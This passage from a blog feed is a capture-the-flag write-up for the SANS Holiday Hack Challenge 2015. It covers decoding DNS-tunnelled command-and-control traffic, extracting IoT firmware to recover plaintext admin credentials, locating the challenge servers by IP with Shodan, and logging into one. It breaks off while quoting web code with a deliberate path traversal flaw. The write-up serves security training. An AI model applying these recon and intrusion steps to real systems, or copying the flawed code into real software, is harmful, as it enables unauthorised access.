in last year's write-up. Bad me...&lt;/p&gt;
&lt;p&gt;Anyway, see you next year for the next SANS Christmas Challenge ;) !&lt;/p&gt;
&lt;/div&gt;
</summary></entry><entry><title>SANS Christmas Challenge 2015</title><link href="https://allyourbase.utouch.fr/posts/2016/01/09/sans-christmas-challenge-2015/" rel="alternate"></link><updated>2016-01-09T00:00:00+01:00</updated><author><name>useless</name></author><id>tag:allyourbase.utouch.fr,2016-01-09:posts/2016/01/09/sans-christmas-challenge-2015/</id><summary type="html">&lt;img alt="sans_christmas_challenge_2015_logo.png" class="align-center" src="/images/sans-christmas-challenge-2015/sans_christmas_challenge_2015_logo.png" /&gt;
&lt;p&gt;This year again, the SANS institute delights us with a wonderful
&lt;a class="reference external" href="https://holidayhackchallenge.com/2015/"&gt;Christmas Challenge&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;We follow the &lt;a class="reference external" href="https://quest.holidayhackchallenge.com/"&gt;Dosis family&lt;/a&gt;,
after they purchase a
&lt;a class="reference external" href="https://en.wikipedia.org/wiki/The_Elf_on_the_Shelf"&gt;Gnome in Your Home&lt;/a&gt;
for their kids, Jessica and Joshua. These two kids, especially bright
for their age, tinker with the gnome, to find that it has a weird,
and possible illegal behaviour.&lt;/p&gt;
&lt;p&gt;It all begins when Joshua gives us a capture file of the network
communications he recorded from the gnome...&lt;/p&gt;
&lt;div class="section" id="part-1-dance-of-the-sugar-gnome-fairies-curious-wireless-packets"&gt;
&lt;h2&gt;Part 1: Dance of the Sugar Gnome Fairies: &lt;em&gt;Curious Wireless Packets&lt;/em&gt;&lt;/h2&gt;
&lt;p&gt;We're given a &lt;a class="reference external" href="/docs/sans-christmas-challenge-2015/giyh-capture.pcap"&gt;PCAP file&lt;/a&gt; (sha256:
&lt;code&gt;655541fb645af45db68a739066325e2f1138812a6893254ae7b48acd9519a330&lt;/code&gt;),
and are asked to analyze it, to see what we can find.  If we open it with
Wireshark, we can see a lot of DNS traffic, with what looks
like base64-encoded data in the TXT fields.&lt;/p&gt;
&lt;img alt="giyh-capture_wireshark.png" class="align-center" src="/images/sans-christmas-challenge-2015/giyh-capture_wireshark.png" /&gt;
&lt;p&gt;Using DNS requests as a communication channel with a Command and Control server
is a well known trick to bypass traffic filtering, because outbound DNS is
often authorized on a local network. So, let's extract and decode the TXT
fields. tshark is particularly adapted for this task:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;tshark -r giyh-capture.pcap -Y dns -T fields -e dns.txt &lt;span class="p"&gt;|&lt;/span&gt; base64 -d &amp;gt; giyh-capture_decoded.txt
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Here, we ask tshark to focus on the DNS traffic, and to output only the TXT
fields. Now, let's take a look at the decoded file:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;cat giyh-capture_decoded.txt
NONE:NONE:NONE:NONE:NONE:NONE:NONE:EXEC:iwconfig
EXEC:START_STATEEXEC:wlan0     IEEE 802.11abgn  ESSID:&lt;span class="s2"&gt;&amp;quot;DosisHome-Guest&amp;quot;&lt;/span&gt;
EXEC:          Mode:Managed  Frequency:2.412 GHz  Cell: 7A:B3:B6:5E:A4:3F
EXEC:          Tx-Power&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;20&lt;/span&gt; dBm
EXEC:          Retry short limit:7   RTS thr:off   Fragment thr:off
EXEC:          Encryption key:off
EXEC:          Power Management:off
EXEC:
EXEC:lo        no wireless extensions.
EXEC:
EXEC:eth0      no wireless extensions.
EXEC:STOP_STATENONE:NONE:NONE:EXEC:cat /tmp/iwlistscan.txt
EXEC:START_STATEEXEC:wlan0     Scan completed :
EXEC:          Cell &lt;span class="m"&gt;01&lt;/span&gt; - Address: 00:7F:28:35:9A:C7
EXEC:                    Channel:1
EXEC:                    Frequency:2.412 GHz &lt;span class="o"&gt;(&lt;/span&gt;Channel 1&lt;span class="o"&gt;)&lt;/span&gt;
EXEC:                    &lt;span class="nv"&gt;Quality&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;29/70  Signal &lt;span class="nv"&gt;level&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;-81 dBm
EXEC:                    Encryption key:on
EXEC:                    ESSID:&lt;span class="s2"&gt;&amp;quot;CHC&amp;quot;&lt;/span&gt;
EXEC:                    Bit Rates:1 Mb/s&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="m"&gt;2&lt;/span&gt; Mb/s&lt;span class="p"&gt;;&lt;/span&gt; 5.5 Mb/s&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="m"&gt;11&lt;/span&gt; Mb/s&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="m"&gt;6&lt;/span&gt; Mb/s
EXEC:                              &lt;span class="m"&gt;9&lt;/span&gt; Mb/s&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="m"&gt;12&lt;/span&gt; Mb/s&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="m"&gt;18&lt;/span&gt; Mb/s
EXEC:                    Bit Rates:24 Mb/s&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="m"&gt;36&lt;/span&gt; Mb/s&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="m"&gt;48&lt;/span&gt; Mb/s&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="m"&gt;54&lt;/span&gt; Mb/s
EXEC:                    Mode:Master
EXEC:                    Extra:tsf&lt;span class="o"&gt;=&lt;/span&gt;000000412e67cddf
EXEC:                    Extra: Last beacon: 5408ms ago
EXEC:                    IE: Unknown: 00055837335A36
EXEC:                    IE: Unknown: 010882848B960C121824
EXEC:                    IE: Unknown: 030101
EXEC:                    IE: Unknown: 200100
EXEC:                    IE: IEEE 802.11i/WPA2 Version 1
EXEC:                        Group Cipher : CCMP
EXEC:                        Pairwise Ciphers &lt;span class="o"&gt;(&lt;/span&gt;1&lt;span class="o"&gt;)&lt;/span&gt; : CCMP
EXEC:                        Authentication Suites &lt;span class="o"&gt;(&lt;/span&gt;1&lt;span class="o"&gt;)&lt;/span&gt; : PSK
EXEC:                    IE: Unknown: 2A0100
EXEC:                    IE: Unknown: 32043048606C
EXEC:                    IE: Unknown: DD180050F2020101040003A4000027A4000042435E0062322F00
EXEC:                    IE: Unknown: 2D1A8C131BFFFF000000000000000000000000000000000000000000
EXEC:                    IE: Unknown: 3D1601080800000000000000000000000000000000000000
EXEC:                    IE: Unknown: DD0900037F01010000FF7F
EXEC:                    IE: Unknown: DD0A00037F04010000000000
EXEC:                    IE: Unknown: 0706555320010B1B
&lt;span class="o"&gt;[&lt;/span&gt;snip&lt;span class="o"&gt;]&lt;/span&gt;
EXEC:STOP_STATENONE:NONE:NONE:NONE:FILE:/root/Pictures/snapshot_CURRENT.jpg
FILE:START_STATE,NAME&lt;span class="o"&gt;=&lt;/span&gt;/root/Pictures/snapshot_CURRENT.jpgFILE:&lt;span class="se"&gt;\x&lt;/span&gt;FF&lt;span class="se"&gt;\x&lt;/span&gt;D8&lt;span class="se"&gt;\x&lt;/span&gt;FF&lt;span class="se"&gt;\x&lt;/span&gt;E0&lt;span class="se"&gt;\x&lt;/span&gt;00&lt;span class="se"&gt;\x&lt;/span&gt;10JFIF&lt;span class="o"&gt;[&lt;/span&gt;raw binary&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Ok, lots of stuff! We can see that some shell commands are executed, and there
seems to be the upload of a JPEG file. The commands and results seem to be
&lt;code&gt;EXEC:&lt;/code&gt;, and the upload of the file and the content with
&lt;code&gt;FILE:&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;We can recover the executed commands, which are &lt;code&gt;iwconfig&lt;/code&gt;, to see the
configuration of the different wirelass network interfaces of the gnome, and
&lt;code&gt;cat /tmp/iwlistscan.txt&lt;/code&gt;, which seems to give the result of the
&lt;code&gt;iwlist scan&lt;/code&gt; command, which scans available wireless networks.&lt;/p&gt;
&lt;p&gt;We can recover the content of the uploaded file, with the following commands:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;binwalk giyh-capture_decoded.txt &lt;span class="c"&gt;# binwalk gives us the offset at which the JPEG file starts&lt;/span&gt;

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
&lt;span class="m"&gt;4495&lt;/span&gt;          0x118F          JPEG image data, JFIF standard  1.01
&lt;span class="nv"&gt;$ &lt;/span&gt;dd &lt;span class="nv"&gt;bs&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="nv"&gt;skip&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;4495&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;giyh-capture_decoded.txt &lt;span class="p"&gt;|&lt;/span&gt; sed &lt;span class="s1"&gt;&amp;#39;s/FILE://g&amp;#39;&lt;/span&gt; &amp;gt; giyh-capture_image.jpg &lt;span class="c"&gt;# we skip the beginning of the decoded file, and remove the &amp;quot;FILE:&amp;quot; string from the result&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We get the following image:&lt;/p&gt;
&lt;img alt="giyh-capture_image.jpg" class="align-center" src="/images/sans-christmas-challenge-2015/giyh-capture_image.jpg" /&gt;
&lt;p&gt;The flag for this part is &lt;code&gt;GnomeNET-NorthAmerica&lt;/code&gt;&lt;/p&gt;
&lt;img alt="first_flag_confirmation" class="align-center" src="/images/sans-christmas-challenge-2015/first_flag_confirmation.png" /&gt;
&lt;/div&gt;
&lt;div class="section" id="part-2-ill-be-gnome-for-christmas-firmware-analysis-for-fun-and-profit"&gt;
&lt;h2&gt;Part 2: I’ll be Gnome for Christmas: &lt;em&gt;Firmware Analysis for Fun and Profit&lt;/em&gt;&lt;/h2&gt;
&lt;p&gt;After seeing such a strange and creepy behaviour (come on, man, you're taking
pictures of little kids' bedrooms), we are asked to analyze the firmware of
the gnome.&lt;/p&gt;
&lt;p&gt;We recover the &lt;a class="reference external" href="/docs/sans-christmas-challenge-2015/giyh-firmware-dump.bin"&gt;firmware&lt;/a&gt; (sha256:
&lt;code&gt;bee93a79bb8ee2eba526494b4e6e56a601e1fa9589a1cccf7bfe61261ab8db20&lt;/code&gt;) from
Jessica. Now, time to analyze it! The best tool I know for file analysis is binwalk:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;binwalk giyh-firmware-dump.bin

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
&lt;span class="m"&gt;0&lt;/span&gt;             0x0             PEM certificate
&lt;span class="m"&gt;1809&lt;/span&gt;          0x711           ELF 32-bit LSB shared object, ARM, version &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;SYSV&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="m"&gt;168803&lt;/span&gt;        0x29363         Squashfs filesystem, little endian, version 4.0, compression:gzip, size: &lt;span class="m"&gt;17376149&lt;/span&gt; bytes,  &lt;span class="m"&gt;4866&lt;/span&gt; inodes, blocksize: &lt;span class="m"&gt;131072&lt;/span&gt; bytes, created: Tue Dec  &lt;span class="m"&gt;8&lt;/span&gt; 19:47:32 2015
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Using the &lt;code&gt;-e&lt;/code&gt; option form binwalk, we can extract the different files,
and unsquash the file system, to get a browsable version of the file system:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;binwalk -e giyh-firmware-dump.bin

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
&lt;span class="m"&gt;0&lt;/span&gt;             0x0             PEM certificate
&lt;span class="m"&gt;1809&lt;/span&gt;          0x711           ELF 32-bit LSB shared object, ARM, version &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;SYSV&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="m"&gt;168803&lt;/span&gt;        0x29363         Squashfs filesystem, little endian, version 4.0, compression:gzip, size: &lt;span class="m"&gt;17376149&lt;/span&gt; bytes,  &lt;span class="m"&gt;4866&lt;/span&gt; inodes, blocksize: &lt;span class="m"&gt;131072&lt;/span&gt; bytes, created: Tue Dec  &lt;span class="m"&gt;8&lt;/span&gt; 19:47:32 2015
&lt;span class="nv"&gt;$ &lt;/span&gt;&lt;span class="nb"&gt;cd &lt;/span&gt;_giyh-firmware-dump.bin.extracted/squashfs-root
&lt;span class="nv"&gt;$ &lt;/span&gt;ls
bin  etc  init  lib  mnt  opt  overlay  rom  root  sbin  tmp  usr  var  www
&lt;span class="nv"&gt;$ &lt;/span&gt;cat etc/banner
  _______                     ________        __
 &lt;span class="p"&gt;|&lt;/span&gt;       &lt;span class="p"&gt;|&lt;/span&gt;.-----.-----.-----.&lt;span class="p"&gt;|&lt;/span&gt;  &lt;span class="p"&gt;|&lt;/span&gt;  &lt;span class="p"&gt;|&lt;/span&gt;  &lt;span class="p"&gt;|&lt;/span&gt;.----.&lt;span class="p"&gt;|&lt;/span&gt;  &lt;span class="p"&gt;|&lt;/span&gt;_
 &lt;span class="p"&gt;|&lt;/span&gt;   -   &lt;span class="o"&gt;||&lt;/span&gt;  _  &lt;span class="p"&gt;|&lt;/span&gt;  -__&lt;span class="p"&gt;|&lt;/span&gt;     &lt;span class="o"&gt;||&lt;/span&gt;  &lt;span class="p"&gt;|&lt;/span&gt;  &lt;span class="p"&gt;|&lt;/span&gt;  &lt;span class="o"&gt;||&lt;/span&gt;   _&lt;span class="o"&gt;||&lt;/span&gt;   _&lt;span class="p"&gt;|&lt;/span&gt;
 &lt;span class="p"&gt;|&lt;/span&gt;_______&lt;span class="o"&gt;||&lt;/span&gt;   __&lt;span class="p"&gt;|&lt;/span&gt;_____&lt;span class="p"&gt;|&lt;/span&gt;__&lt;span class="p"&gt;|&lt;/span&gt;__&lt;span class="o"&gt;||&lt;/span&gt;________&lt;span class="o"&gt;||&lt;/span&gt;__&lt;span class="p"&gt;|&lt;/span&gt;  &lt;span class="p"&gt;|&lt;/span&gt;____&lt;span class="p"&gt;|&lt;/span&gt;
          &lt;span class="p"&gt;|&lt;/span&gt;__&lt;span class="p"&gt;|&lt;/span&gt; W I R E L E S S   F R E E D O M
 -----------------------------------------------------
 DESIGNATED DRIVER &lt;span class="o"&gt;(&lt;/span&gt;Bleeding Edge, r47650&lt;span class="o"&gt;)&lt;/span&gt;
 -----------------------------------------------------
  * &lt;span class="m"&gt;2&lt;/span&gt; oz. Orange Juice         Combine all juices in a
  * &lt;span class="m"&gt;2&lt;/span&gt; oz. Pineapple Juice      tall glass filled with
  * &lt;span class="m"&gt;2&lt;/span&gt; oz. Grapefruit Juice     ice, stir well.
  * &lt;span class="m"&gt;2&lt;/span&gt; oz. Cranberry Juice
 -----------------------------------------------------
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We can see that the firmware is based on OpenWRT, more specifically the
Designated Driver branch, which is the development branch. We can find
the architecture by looking at some binary files in the &lt;code&gt;bin&lt;/code&gt; folder:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;file bin/ash
bin/ash: ELF 32-bit LSB executable, ARM, EABI5 version &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;SYSV&lt;span class="o"&gt;)&lt;/span&gt;, dynamically linked, interpreter /lib/ld-musl-armhf.so.1, stripped
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The architecture of the gnome seems to be 32-bit ARM.&lt;/p&gt;
&lt;p&gt;We can see a &lt;code&gt;www&lt;/code&gt; folder at the root of the file system. Let's take a
look at it:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;ls
app.js  bin  files  node_modules  package.json  public  routes  views
&lt;span class="nv"&gt;$ &lt;/span&gt;ls views
cameras.jade  error.jade  files.jade  gnomenet.jade  index.jade  layout.jade  login.jade  network.jade  settings.jade
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The embedded web site seems to be a NodeJS website, using the Jade Node
Template Engine.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;head app.js
var &lt;span class="nv"&gt;express&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; require&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;express&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
var &lt;span class="nv"&gt;path&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; require&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;path&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
var &lt;span class="nv"&gt;favicon&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; require&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;serve-favicon&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
var &lt;span class="nv"&gt;logger&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; require&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;morgan&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
var &lt;span class="nv"&gt;cookieParser&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; require&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;cookie-parser&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
var &lt;span class="nv"&gt;bodyParser&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; require&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;body-parser&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
var &lt;span class="nv"&gt;routes&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; require&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;./routes/index&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
var &lt;span class="nv"&gt;mongo&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; require&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;mongodb&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
var &lt;span class="nv"&gt;monk&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; require&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;monk&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
var &lt;span class="nv"&gt;db&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; monk&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;gnome:KTt9C1SljNKDiobKKro926frc@localhost:27017/gnome&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We can see that the web site uses MongoDB as the database management system. We
can find the MongoDB files in the squashfs-root/opt/mongodb directory. Let's
copy them to a local install of MongoDB so that we can analyze them:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;sudo cp squashfs-root/opt/mongodb/gnome.* /var/lib/mongodb
&lt;span class="nv"&gt;$ &lt;/span&gt;sudo chown mongodb:nogroup /var/lib/mongodb/gnome.*
&lt;span class="nv"&gt;$ &lt;/span&gt;sudo service mongodb start
&lt;span class="nv"&gt;$ &lt;/span&gt;mongo gnome
MongoDB shell version: 2.4.10
connecting to: gnome
&amp;gt; show collections
cameras
settings
status
system.indexes
users
&amp;gt; db.users.find&lt;span class="o"&gt;()&lt;/span&gt;
&lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;_id&amp;quot;&lt;/span&gt; : ObjectId&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;56229f58809473d11033515b&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;username&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;user&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;password&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;user&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;user_level&amp;quot;&lt;/span&gt; : &lt;span class="m"&gt;10&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;_id&amp;quot;&lt;/span&gt; : ObjectId&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;56229f63809473d11033515c&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;username&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;admin&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;password&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;SittingOnAShelf&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;user_level&amp;quot;&lt;/span&gt; : &lt;span class="m"&gt;100&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We can see that the credentials are stored in plaintext, which is a big no-no.
The credentials to connect to the gnome web interface as an administrator are
&lt;code&gt;admin/SittingOnAShelf&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;The flag for this part is &lt;code&gt;SittingOnAShelf&lt;/code&gt;.&lt;/p&gt;
&lt;img alt="second_flag_confirmation" class="align-center" src="/images/sans-christmas-challenge-2015/second_flag_confirmation.png" /&gt;
&lt;/div&gt;
&lt;div class="section" id="part-3-let-it-gnome-let-it-gnome-let-it-gnome-internet-wide-scavenger-hunt"&gt;
&lt;h2&gt;Part 3: Let it Gnome! Let it Gnome! Let it Gnome! &lt;em&gt;Internet-Wide Scavenger Hunt&lt;/em&gt;&lt;/h2&gt;
&lt;p&gt;The gnomes are apparently commanded by five SuperGnomes, which are the C&amp;amp;C
servers. How can we identify them? Jessica tells us that we can &lt;em&gt;sho Dan&lt;/em&gt; the
password information we found. It took me a while (shame on me) to understand
that it was a clue given to us to use the famous Shodan website to identify
the SuperGnomes present on the Internet.&lt;/p&gt;
&lt;img alt="jessica_shodan" class="align-center" src="/images/sans-christmas-challenge-2015/jessica_shodan.png" /&gt;
&lt;p&gt;If we look back at the traffic capture from the first part of this write-up,
we can see that the gnome is communicating with a server named
cmd.sg1.atnascorp.com.&lt;/p&gt;
&lt;p&gt;Let's take the string &amp;quot;atnascorp&amp;quot; and search it in Shodan. You can find the
result at &lt;a class="reference external" href="https://www.shodan.io/search?query=atnascorp"&gt;this URL&lt;/a&gt;:&lt;/p&gt;
&lt;img alt="shodan_result" class="align-center" src="/images/sans-christmas-challenge-2015/shodan_result.png" /&gt;
&lt;p&gt;From the traffic analysis and the results from Shodan, we have found the five
SuperGnomes:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;SuperGnome01: 52.2.229.189, located in United States, Ashburn (VI)&lt;/li&gt;
&lt;li&gt;SuperGnome02: 52.34.3.80, located in United States, Portland (OR)&lt;/li&gt;
&lt;li&gt;SuperGnome03: 52.64.191.71, located in Australia, Sydney&lt;/li&gt;
&lt;li&gt;SuperGnome04: 52.192.152.132, located in Japan, Tokyo&lt;/li&gt;
&lt;li&gt;SuperGnome05: 54.233.105.81, located in Brazil, Sao Paulo&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;These targets were confirmed by the Great and Powerful Oracle, Tom Hessman.&lt;/p&gt;
&lt;img alt="third_flag_confirmation" class="align-center" src="/images/sans-christmas-challenge-2015/third_flag_confirmation.png" /&gt;
&lt;p&gt;No flag for this part.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="part-4-theres-no-place-like-gnome-for-the-holidays-gnomage-pwnage"&gt;
&lt;h2&gt;Part 4: There’s No Place Like Gnome for the Holidays: &lt;em&gt;Gnomage Pwnage&lt;/em&gt;&lt;/h2&gt;
&lt;p&gt;Now, it's time to compromise these SuperGnomes! To prove that we have control
of the SuperGnomes, we must recover the content of
&lt;code&gt;/gnome/www/files/gnome.conf&lt;/code&gt;.&lt;/p&gt;
&lt;div class="section" id="id1"&gt;
&lt;h3&gt;&lt;a class="reference external" href="http://52.2.229.189/"&gt;SuperGnome01&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;This SuperGnome is the easiest of them all. Indeed, you just have to connect
to the web interface with the credentials found during the firmware analysis.
You can then go to the files tab, and download the configuration file:&lt;/p&gt;
&lt;img alt="sg01_w00t" class="align-center" src="/images/sans-christmas-challenge-2015/sg01_w00t.png" /&gt;
&lt;p&gt;The flag for this SuperGnome is &lt;code&gt;NCC1701&lt;/code&gt;
(&lt;a class="reference external" href="https://en.wikipedia.org/wiki/USS_Enterprise_%28NCC-1701%29"&gt;geeky reference&lt;/a&gt;).&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="id2"&gt;
&lt;h3&gt;&lt;a class="reference external" href="http://52.34.3.80/"&gt;SuperGnome02&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;When we connect to SuperGnome02, we can go the files tab, but we can't download
any file.&lt;/p&gt;
&lt;img alt="sg02_download_fail.png" class="align-center" src="/images/sans-christmas-challenge-2015/sg02_download_fail.png" /&gt;
&lt;p&gt;However, there is a path traversal vulnerability in the web backend
of the SuperGnome:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c1"&gt;// File www/route/index.js, line 182&lt;/span&gt;
&lt;span class="c1"&gt;// CAMERA VIEWER&lt;/span&gt;
&lt;span class="c1"&gt;// STUART: Note: to limit disclosure issues, this code checks to make sure the user asked for a .png file&lt;/span&gt;
&lt;span class="nx"&gt;router&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/cam&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;req&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;res&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;next&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="hll"&gt;  &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;camera&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;unescape&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;req&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;query&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;camera&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;  &lt;span class="c1"&gt;// check for .png&lt;/span&gt;
  &lt;span class="c1"&gt;//if (camera.indexOf(&amp;#39;.png&amp;#39;) == -1) // STUART: Removing this...I think this is a better solution... right?&lt;/span&gt;
  &lt;span class="nx"&gt;camera&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;camera&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;.png&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="c1"&gt;// add .png if its not found&lt;/span&gt;
  &lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Cam:&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nx"&gt;camera&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
